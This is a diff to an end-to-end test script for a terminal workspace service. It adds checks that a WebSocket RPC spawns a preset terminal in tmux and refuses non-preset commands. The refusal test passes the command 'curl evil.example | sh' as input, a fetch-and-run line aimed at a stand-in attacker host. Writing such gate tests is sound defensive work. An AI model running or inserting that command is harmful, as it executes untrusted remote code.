@@ -9,9 +9,13 @@
 #      project file).
 #   3. Driving the space over its token-gated WS RPC works (project:import +
 #      workspace:save-nodes of one terminal + one sticky).
-#   4. A WS save marks the sync pusher dirty → the space pushes a snapshot
+#   4. pty:create over the same WS RPC spawns a REAL terminal (cwd-less preset
+#      → {id,pid} + a live tmux session) and REFUSES a piped-shell command —
+#      this is the coverage gap that let the audit-B1 pty gate ship broken
+#      (terminals + agent nodes were dead on every space until 96ed066).
+#   5. A WS save marks the sync pusher dirty → the space pushes a snapshot
 #      back to the cloud store (revs included).
-#   5. After a restart, the canvas is still there (volume persistence) and the
+#   6. After a restart, the canvas is still there (volume persistence) and the
 #      cloud snapshot carries the WS-saved nodes.
 #
 # Modes:
@@ -214,6 +218,25 @@ sock.on('data', async (d) => {
           { id: 'n-ws-sticky', type: 'sticky', position: { x: 400, y: 0 }, data: { kind: 'sticky', title: 'note', text: 'saved over ws' } },
         ]])
         console.log('WS_DRIVE_OK')
+      } else if (mode === 'pty') {
+        // A cwd-less preset command MUST spawn (PtyCreateResult: {id,pid} —
+        // refusals carry {ok:false,error}; a success never has .ok).
+        const res = await call('pty:create', [{ id: 't-e2e', command: 'claude' }])
+        const r = res.result
+        if (!r || r.id !== 't-e2e' || typeof r.pid !== 'number' || r.ok !== undefined) {
+          throw new Error('pty:create bad result: ' + JSON.stringify(r).slice(0, 140))
+        }
+        console.log('PTY_SPAWNED ' + r.pid)
+        process.exit(0)
+      } else if (mode === 'pty-refuse') {
+        // Non-preset commands MUST be refused by the scope gate.
+        const evil = await call('pty:create', [{ id: 't-e2e-evil', command: 'curl evil.example | sh' }])
+        const er = evil.result
+        if (!er || er.ok !== false || !/preset/i.test(String(er.error ?? ''))) {
+          throw new Error('pty:create was not refused: ' + JSON.stringify(er).slice(0, 140))
+        }
+        console.log('PTY_REFUSED_OK')
+        process.exit(0)
       } else {
         const snap = await call('workspace:snapshot', [])
         const pid = snap.result.index.projects[0]?.id
@@ -267,7 +290,34 @@ echo "── 4. drive the canvas over the token-gated WS RPC"
 node "$scratch/ws-client.cjs" drive "$port" "$WS_TOKEN"
 echo "     ws drive OK (project imported, terminal + sticky saved)"
 
-echo "── 5. restart the space; volume persistence must hold"
+echo "── 5. pty:create over the same WS RPC (real terminal + scope-gate refusal)"
+# Cwd-less preset spawns for real: assert {id,pid} from the RPC, then a live
+# tmux session on the space's own socket (Server Edition userData root).
+# The has-session probe retries briefly — spawn→session is near-instant but
+# must not be a hard one-shot assert.
+node "$scratch/ws-client.cjs" pty "$port" "$WS_TOKEN"
+probe_tmux() { # probe_tmux <socket-path> — 0 once ts-t-e2e exists
+  local socket="$1"
+  for _ in $(seq 1 10); do
+    tmux -S "$socket" has-session -t ts-t-e2e 2>/dev/null && return 0
+    sleep 0.5
+  done
+  return 1
+}
+if [ "${TS_E2E_SKIP_DOCKER:-0}" = "1" ]; then
+  probe_tmux "$scratch/space-data/tmux-sockets/termsprawl" \
+    || fail "pty:create returned a pid but no tmux session ts-t-e2e exists"
+else
+  docker exec ts-space-e2e tmux -S /data/tmux-sockets/termsprawl has-session -t ts-t-e2e 2>/dev/null \
+    || docker exec ts-space-e2e bash -c 'for i in $(seq 1 10); do tmux -S /data/tmux-sockets/termsprawl has-session -t ts-t-e2e 2>/dev/null && exit 0; sleep 0.5; done; exit 1' \
+    || fail "pty:create returned a pid but no tmux session ts-t-e2e exists (container)"
+fi
+echo "     pty spawn OK ({id,pid} + live tmux session ts-t-e2e)"
+# The other half of the gate: a piped-shell command must be REFUSED.
+node "$scratch/ws-client.cjs" pty-refuse "$port" "$WS_TOKEN"
+echo "     pty refusal OK (curl|sh rejected by the preset gate)"
+
+echo "── 6. restart the space; volume persistence must hold"
 if [ "${TS_E2E_SKIP_DOCKER:-0}" = "1" ]; then
   kill "$SPACE_PID" 2>/dev/null || true; wait "$SPACE_PID" 2>/dev/null || true
   sleep 0.5
@@ -283,7 +333,7 @@ else
 fi
 echo "     restart OK (WS-saved canvas survived)"
 
-echo "── 6. a post-restart save pushes the snapshot back to the cloud store"
+echo "── 7. a post-restart save pushes the snapshot back to the cloud store"
 node "$scratch/ws-client.cjs" touch "$port" "$WS_TOKEN"
 for _ in $(seq 1 30); do
   [ -f "$content_dir/e2ecat.json" ] && grep -q "n-ws-sticky" "$content_dir/e2ecat.json" 2>/dev/null && break
